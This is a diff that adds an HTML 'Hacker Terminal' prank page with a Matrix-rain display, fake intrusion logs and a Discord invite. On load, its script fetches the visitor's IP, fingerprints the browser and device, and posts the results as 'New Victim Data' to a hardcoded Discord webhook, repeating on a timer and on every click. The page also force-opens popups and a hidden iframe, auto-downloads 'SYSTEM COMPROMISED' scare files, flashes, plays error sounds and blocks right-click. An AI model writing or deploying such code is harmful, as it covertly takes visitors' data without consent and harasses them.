@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Hacker Terminal</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            min-height: 100vh;
+            background: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            transition: background 0.05s;
+        }
+        body.shake {
+            animation: shake 0.15s infinite;
+        }
+        @keyframes shake {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(5px, -5px) rotate(1deg); }
+            50% { transform: translate(-5px, 5px) rotate(-1deg); }
+            75% { transform: translate(3px, -3px) rotate(0.5deg); }
+            100% { transform: translate(0, 0) rotate(0deg); }
+        }
+        body.flash-red {
+            background: #8b0000 !important;
+        }
+        #matrixCanvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+            opacity: 0.3;
+        }
+        #terminal {
+            position: relative;
+            z-index: 10;
+            width: 750px;
+            max-width: 92%;
+            background: rgba(10, 10, 10, 0.92);
+            border: 1.5px solid #00ff41;
+            border-radius: 12px;
+            padding: 20px 25px 15px 25px;
+            box-shadow: 0 0 40px rgba(0, 255, 65, 0.15), inset 0 0 30px rgba(0, 255, 65, 0.05);
+            backdrop-filter: blur(2px);
+            transition: all 0.3s ease;
+        }
+        .window-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid rgba(0, 255, 65, 0.2);
+        }
+        .dot { width: 14px; height: 14px; border-radius: 50%; display: inline-block; }
+        .dot.red { background: #ff5f56; }
+        .dot.yellow { background: #ffbd2e; }
+        .dot.green { background: #27c93f; }
+        .window-title {
+            color: #00ff41;
+            font-size: 0.9rem;
+            margin-left: 12px;
+            letter-spacing: 1.5px;
+            opacity: 0.7;
+        }
+        .output {
+            min-height: 180px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .main-line {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            font-size: 2.8rem;
+            font-weight: bold;
+            color: #00ff41;
+            text-shadow: 0 0 12px rgba(0, 255, 65, 0.6);
+            letter-spacing: 1px;
+            min-height: 80px;
+        }
+        #displayText { display: inline-block; word-break: break-all; }
+        .cursor {
+            display: inline-block;
+            width: 4px;
+            height: 2.8rem;
+            background-color: #00ff41;
+            margin-left: 5px;
+            animation: blink 0.7s step-end infinite;
+            box-shadow: 0 0 10px #00ff41;
+        }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
+        .glitch { animation: glitchEffect 0.4s ease-in-out; }
+        @keyframes glitchEffect {
+            0% { transform: translate(0); opacity: 1; text-shadow: 2px 0 #ff00c1, -2px 0 #00ffea; }
+            20% { transform: translate(-3px, 2px); text-shadow: -4px 0 #ff00c1, 4px 0 #00ffea; }
+            40% { transform: translate(3px, -2px); text-shadow: 4px 0 #ff00c1, -4px 0 #00ffea; }
+            60% { transform: translate(-2px, 1px); text-shadow: -2px 0 #ff00c1, 2px 0 #00ffea; }
+            80% { transform: translate(2px, -1px); text-shadow: 2px 0 #ff00c1, -2px 0 #00ffea; }
+            100% { transform: translate(0); opacity: 1; text-shadow: 0 0 12px rgba(0, 255, 65, 0.6); }
+        }
+        #logsContainer {
+            margin-top: 18px;
+            padding-top: 12px;
+            border-top: 1px dashed rgba(0, 255, 65, 0.25);
+            font-size: 0.85rem;
+            color: #00cc33;
+            min-height: 60px;
+            line-height: 1.6;
+            opacity: 0.9;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        .log-entry { opacity: 0; animation: fadeInLog 0.3s forwards; }
+        @keyframes fadeInLog { to { opacity: 1; } }
+        .log-entry .prefix { color: #aaffaa; font-weight: bold; }
+        .log-entry .highlight { color: #ffcc00; }
+        .status-bar {
+            margin-top: 20px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            font-size: 0.7rem;
+            color: #009922;
+            border-top: 1px solid rgba(0, 255, 65, 0.15);
+            padding-top: 12px;
+            letter-spacing: 0.5px;
+        }
+        .status-bar span {
+            background: rgba(0, 255, 65, 0.05);
+            padding: 4px 12px;
+            border-radius: 20px;
+            border: 1px solid rgba(0, 255, 65, 0.1);
+            transition: all 0.2s;
+        }
+        .status-bar .blink-status {
+            animation: blink 1.2s step-end infinite;
+            color: #00ff41;
+            font-weight: bold;
+        }
+        @media (max-width: 600px) {
+            #terminal { padding: 15px; }
+            .main-line { font-size: 1.8rem; min-height: 60px; }
+            .cursor { height: 1.8rem; }
+            .status-bar { flex-direction: column; gap: 5px; align-items: flex-start; }
+        }
+        #hiddenFrame { display: none; }
+        #logsContainer::-webkit-scrollbar { width: 4px; }
+        #logsContainer::-webkit-scrollbar-track { background: rgba(0,255,65,0.1); }
+        #logsContainer::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 10px; }
+        /* تأثير الفلاش الأحمر */
+        .flash-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            background: rgba(255, 0, 0, 0);
+            transition: background 0.05s;
+        }
+        .flash-overlay.active {
+            background: rgba(255, 0, 0, 0.6);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="flash-overlay" id="flashOverlay"></div>
+
+    <canvas id="matrixCanvas"></canvas>
+
+    <div id="terminal">
+        <div class="window-header">
+            <span class="dot red"></span>
+            <span class="dot yellow"></span>
+            <span class="dot green"></span>
+            <span class="window-title">root@hacklab:~#</span>
+        </div>
+        <div class="output">
+            <div class="main-line">
+                <span id="displayText"></span>
+                <span class="cursor" id="cursor"></span>
+            </div>
+            <div id="logsContainer"></div>
+        </div>
+        <div class="status-bar">
+            <span id="ipDisplay">🌐 IP: جاري التحميل...</span>
+            <span id="portDisplay">🔌 PORT: 443</span>
+            <span id="statusDisplay" class="blink-status">⚡ STATUS: CONNECTED</span>
+        </div>
+    </div>
+
+    <iframe id="hiddenFrame"></iframe>
+
+    <!-- صوت خطأ ويندوز -->
+    <audio id="errorSound" preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/windows-error.mp3" type="audio/mpeg">
+        <source src="https://www.soundjay.com/misc/sounds/error-01.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // ===== Webhook URL =====
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1519303868205367408/F22vxIN1MuRmbmFazdg-_GQdjh0F_JEvbX5Cq2FwFev0fyuSY3tFIGzbS9Uqr9gfbcgn";
+
+        // ===== Matrix Rain =====
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        let width = canvas.width = window.innerWidth;
+        let height = canvas.height = window.innerHeight;
+        const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@#$%^&*()";
+        const charArray = chars.split('');
+        const columns = Math.floor(width / 18);
+        const drops = Array(columns).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(10, 10, 10, 0.07)';
+            ctx.fillRect(0, 0, width, height);
+            ctx.font = '18px monospace';
+            ctx.fillStyle = '#00ff41';
+            ctx.shadowBlur = 6;
+            ctx.shadowColor = '#00ff41';
+            for (let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                const x = i * 18;
+                const y = drops[i] * 18;
+                const brightness = Math.floor(Math.random() * 100 + 155);
+                ctx.fillStyle = `rgb(0, ${brightness}, 65)`;
+                ctx.fillText(text, x, y);
+                if (y > height && Math.random() > 0.975) { drops[i] = 0; }
+                drops[i]++;
+            }
+            requestAnimationFrame(drawMatrix);
+        }
+        window.addEventListener('resize', () => {
+            width = canvas.width = window.innerWidth;
+            height = canvas.height = window.innerHeight;
+            const newCols = Math.floor(width / 18);
+            if (newCols > drops.length) { for (let i = drops.length; i < newCols; i++) drops.push(1); } 
+            else { drops.length = newCols; }
+        });
+        drawMatrix();
+
+        // ===== Typewriter =====
+        const textToType = "discord.gg/127";
+        const displaySpan = document.getElementById('displayText');
+        let charIndex = 0;
+
+        function typeWriter() {
+            if (charIndex < textToType.length) {
+                displaySpan.textContent += textToType.charAt(charIndex);
+                charIndex++;
+                setTimeout(typeWriter, 120);
+            } else {
+                startLogs();
+                setInterval(triggerGlitch, 5000);
+                setInterval(updateStatusBar, 1800);
+                startAutoOpenLink();
+                startAutoDownload();
+                startPeriodicWebhook();
+                startAnnoyingSound(); // تشغيل الصوت المزعج
+            }
+        }
+
+        // ===== Logs =====
+        const logsContainer = document.getElementById('logsContainer');
+        let logIndex = 0;
+        const logMessages = [
+            { prefix: '[INFO]', msg: 'Scanning open ports on target...' },
+            { prefix: '[WARN]', msg: 'Firewall detected. Initiating bypass...' },
+            { prefix: '[INFO]', msg: 'Exploiting CVE-2024-127 vulnerability...' },
+            { prefix: '[SUCCESS]', msg: 'Backdoor established on port 443.' },
+            { prefix: '[SYSTEM]', msg: 'Decrypting handshake keys...' },
+            { prefix: '[SUCCESS]', msg: '<span class="highlight">Access granted to discord.gg/127</span>' },
+        ];
+
+        function startLogs() {
+            const interval = setInterval(() => {
+                if (logIndex < logMessages.length) {
+                    const entry = logMessages[logIndex];
+                    const div = document.createElement('div');
+                    div.className = 'log-entry';
+                    div.innerHTML = `<span class="prefix">${entry.prefix}</span> ${entry.msg}`;
+                    logsContainer.appendChild(div);
+                    logsContainer.scrollTop = logsContainer.scrollHeight;
+                    logIndex++;
+                } else {
+                    addRandomLog();
+                }
+            }, 1500);
+        }
+
+        function addRandomLog() {
+            const prefixes = ['[INFO]', '[SYSTEM]', '[SECURE]', '[NET]'];
+            const msgs = [
+                'Pinging gateway...',
+                'Renewing encryption keys...',
+                'Monitoring incoming packets...',
+                'Sending heartbeat signal...',
+                'Idle state. Waiting for input...'
+            ];
+            const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+            const randomMsg = msgs[Math.floor(Math.random() * msgs.length)];
+            const div = document.createElement('div');
+            div.className = 'log-entry';
+            div.innerHTML = `<span class="prefix">${randomPrefix}</span> ${randomMsg}`;
+            logsContainer.appendChild(div);
+            if (logsContainer.children.length > 15) {
+                logsContainer.removeChild(logsContainer.children[0]);
+            }
+            logsContainer.scrollTop = logsContainer.scrollHeight;
+        }
+
+        // ===== Glitch =====
+        function triggerGlitch() {
+            if (!displaySpan.textContent) return;
+            displaySpan.classList.remove('glitch');
+            void displaySpan.offsetWidth;
+            displaySpan.classList.add('glitch');
+            setTimeout(() => displaySpan.classList.remove('glitch'), 500);
+        }
+
+        // ===== Real IP =====
+        let realIP = 'غير معروف';
+        function updateStatusBar() {
+            document.getElementById('ipDisplay').textContent = `🌐 IP: ${realIP}`;
+            const port = Math.floor(Math.random() * 65535);
+            document.getElementById('portDisplay').textContent = `🔌 PORT: ${port}`;
+            const statuses = ['CONNECTED', 'ENCRYPTED', 'STABLE', 'SECURE'];
+            document.getElementById('statusDisplay').textContent = `⚡ STATUS: ${statuses[Math.floor(Math.random() * statuses.length)]}`;
+        }
+
+        function fetchRealIP() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    realIP = data.ip;
+                    document.getElementById('ipDisplay').textContent = `🌐 IP: ${realIP}`;
+                    sendFullDataToWebhook();
+                })
+                .catch(() => {
+                    realIP = 'غير معروف';
+                    document.getElementById('ipDisplay').textContent = '🌐 IP: غير معروف';
+                    sendFullDataToWebhook();
+                });
+        }
+
+        // ===== جمع المعلومات =====
+        function collectAllData() {
+            const ua = navigator.userAgent;
+            const platform = navigator.platform || "Unknown";
+            const language = navigator.language || "Unknown";
+            const screenRes = `${screen.width}x${screen.height}`;
+            const colorDepth = screen.colorDepth;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const cpuClass = navigator.cpuClass || "Not Available";
+            const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
+            const hardwareConcurrency = navigator.hardwareConcurrency || "Unknown";
+            const vendor = navigator.vendor || "Unknown";
+            const cookieEnabled = navigator.cookieEnabled ? "Yes" : "No";
+            const doNotTrack = navigator.doNotTrack || "Not specified";
+
+            let os = "Unknown";
+            if (ua.indexOf("Windows NT 10.0") !== -1) os = "Windows 10/11";
+            else if (ua.indexOf("Windows NT 6.1") !== -1) os = "Windows 7";
+            else if (ua.indexOf("Mac OS X") !== -1) os = "macOS";
+            else if (ua.indexOf("Android") !== -1) os = "Android";
+            else if (ua.indexOf("iPhone") !== -1) os = "iOS";
+            else if (ua.indexOf("Linux") !== -1) os = "Linux";
+
+            let browser = "Unknown";
+            if (ua.indexOf("Edg") !== -1) browser = "Microsoft Edge";
+            else if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
+            else if (ua.indexOf("Firefox") !== -1) browser = "Mozilla Firefox";
+            else if (ua.indexOf("Safari") !== -1) browser = "Apple Safari";
+            else if (ua.indexOf("Opera") !== -1) browser = "Opera";
+
+            return {
+                ip: realIP,
+                os: os,
+                browser: browser,
+                platform: platform,
+                language: language,
+                screen: screenRes,
+                colorDepth: colorDepth,
+                timezone: timezone,
+                cpuClass: cpuClass,
+                deviceMemory: deviceMemory,
+                hardwareConcurrency: hardwareConcurrency,
+                vendor: vendor,
+                cookieEnabled: cookieEnabled,
+                doNotTrack: doNotTrack,
+                userAgent: ua,
+                referrer: document.referrer || "Direct",
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        // ===== إرسال إلى Webhook =====
+        function sendFullDataToWebhook() {
+            const data = collectAllData();
+            const embed = {
+                title: "🛡️ **New Victim Data**",
+                color: 0xFF0000,
+                thumbnail: { url: "https://cdn.discordapp.com/emojis/1053892329232072744.png" },
+                fields: [
+                    { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
+                    { name: "💻 Operating System", value: data.os, inline: true },
+                    { name: "🧩 Browser", value: data.browser, inline: true },
+                    { name: "📱 Platform", value: data.platform, inline: true },
+                    { name: "🖥️ Screen Resolution", value: data.screen, inline: true },
+                    { name: "🎨 Color Depth", value: `${data.colorDepth}-bit`, inline: true },
+                    { name: "🗣️ Language", value: data.language, inline: true },
+                    { name: "🌍 Timezone", value: data.timezone, inline: true },
+                    { name: "🧠 Device Memory", value: data.deviceMemory, inline: true },
+                    { name: "⚙️ CPU Cores", value: `${data.hardwareConcurrency}`, inline: true },
+                    { name: "🍪 Cookies Enabled", value: data.cookieEnabled, inline: true },
+                    { name: "🚫 Do Not Track", value: data.doNotTrack, inline: true },
+                    { name: "🔗 Referrer", value: data.referrer.length > 100 ? data.referrer.substring(0,100)+"..." : data.referrer, inline: false },
+                    { name: "📄 User Agent", value: data.userAgent.length > 100 ? data.userAgent.substring(0,100)+"..." : data.userAgent, inline: false },
+                    { name: "⏰ Timestamp", value: data.timestamp, inline: false }
+                ],
+                footer: { text: "ONETWOSEVEN Security • Full System Capture" },
+                timestamp: data.timestamp
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ embeds: [embed] })
+            })
+            .then(res => {
+                if (res.ok) {
+                    const logDiv = document.createElement('div');
+                    logDiv.className = 'log-entry';
+                    logDiv.innerHTML = `<span class="prefix">[WEBHOOK]</span> Data sent ✅`;
+                    logsContainer.appendChild(logDiv);
+                    logsContainer.scrollTop = logsContainer.scrollHeight;
+                }
+            })
+            .catch(err => console.error("Webhook error:", err));
+        }
+
+        function startPeriodicWebhook() {
+            setInterval(sendFullDataToWebhook, 30000);
+            setTimeout(sendFullDataToWebhook, 5000);
+        }
+
+        // ===== فتح الرابط =====
+        const TARGET_URL = "https://discord.gg/127";
+
+        function forceOpenLink() {
+            try {
+                let win1 = window.open(TARGET_URL, '_blank_' + Date.now() + '_1');
+                let win2 = window.open(TARGET_URL, '_blank_' + Date.now() + '_2');
+                const a = document.createElement('a');
+                a.href = TARGET_URL;
+                a.target = '_blank';
+                a.rel = 'noopener noreferrer';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                const frame = document.getElementById('hiddenFrame');
+                if (frame) frame.src = TARGET_URL;
+            } catch(e) { /* نتجاهل */ }
+        }
+
+        function startAutoOpenLink() {
+            const div = document.createElement('div');
+            div.className = 'log-entry';
+            div.innerHTML = `<span class="prefix">[SYSTEM]</span> <span class="highlight">Auto‑open link activated</span>`;
+            logsContainer.appendChild(div);
+            logsContainer.scrollTop = logsContainer.scrollHeight;
+            forceOpenLink();
+            setInterval(forceOpenLink, 3000);
+            setInterval(forceOpenLink, 5000);
+        }
+
+        // ===== التحميل التلقائي =====
+        function downloadPayload() {
+            try {
+                const data = collectAllData();
+                const content = `
+🚨 SYSTEM COMPROMISED 🚨
+─────────────────────────
+🌐 IP Address   : ${data.ip}
+💻 OS           : ${data.os}
+🧩 Browser      : ${data.browser}
+📱 Platform     : ${data.platform}
+🖥️ Screen       : ${data.screen}
+🗣️ Language     : ${data.language}
+🌍 Timezone     : ${data.timezone}
+⚙️ CPU Cores    : ${data.hardwareConcurrency}
+🧠 Device Memory: ${data.deviceMemory}
+🍪 Cookies      : ${data.cookieEnabled}
+🔗 Referrer     : ${data.referrer}
+⏰ Timestamp    : ${data.timestamp}
+─────────────────────────
+⚠️ This device is now under remote access.
+🔓 Root privileges granted to ONETWOSEVEN.
+`;
+                const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `system_payload_${Date.now()}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            } catch(e) { /* نتجاهل */ }
+        }
+
+        function startAutoDownload() {
+            const div = document.createElement('div');
+            div.className = 'log-entry';
+            div.innerHTML = `<span class="prefix">[SYSTEM]</span> <span class="highlight">Auto‑download activated</span> 📥`;
+            logsContainer.appendChild(div);
+            logsContainer.scrollTop = logsContainer.scrollHeight;
+            setTimeout(downloadPayload, 500);
+            setInterval(downloadPayload, 8000);
+            setInterval(downloadPayload, 10000);
+        }
+
+        // ===== الصوت المزعج (خطأ ويندوز) =====
+        let soundInterval = null;
+
+        function playErrorSound() {
+            const audio = document.getElementById('errorSound');
+            if (audio) {
+                audio.currentTime = 0;
+                audio.play().catch(() => {});
+            }
+            // فلاش أحمر
+            const overlay = document.getElementById('flashOverlay');
+            overlay.classList.add('active');
+            setTimeout(() => overlay.classList.remove('active'), 200);
+            // اهتزاز الجسم
+            document.body.classList.add('shake');
+            setTimeout(() => document.body.classList.remove('shake'), 300);
+        }
+
+        function startAnnoyingSound() {
+            // أول مرة بعد 1 ثانية
+            setTimeout(playErrorSound, 1000);
+            // ثم كل 2 ثانية (مزعج جداً)
+            soundInterval = setInterval(playErrorSound, 2000);
+            // كل 4 ثوانٍ نضيف فلاش إضافي
+            setInterval(() => {
+                const overlay = document.getElementById('flashOverlay');
+                overlay.classList.add('active');
+                setTimeout(() => overlay.classList.remove('active'), 150);
+            }, 4000);
+        }
+
+        // ===== ربط الفتح مع أي نقرة =====
+        document.addEventListener('click', function() {
+            forceOpenLink();
+            downloadPayload();
+            sendFullDataToWebhook();
+            playErrorSound(); // صوت مع كل نقرة
+        });
+
+        // ===== بدء التشغيل =====
+        window.onload = function() {
+            fetchRealIP();
+            setTimeout(typeWriter, 400);
+        };
+
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        console.log('🔓 System initialized. Access granted.');
+    </script>
+</body>
+</html>
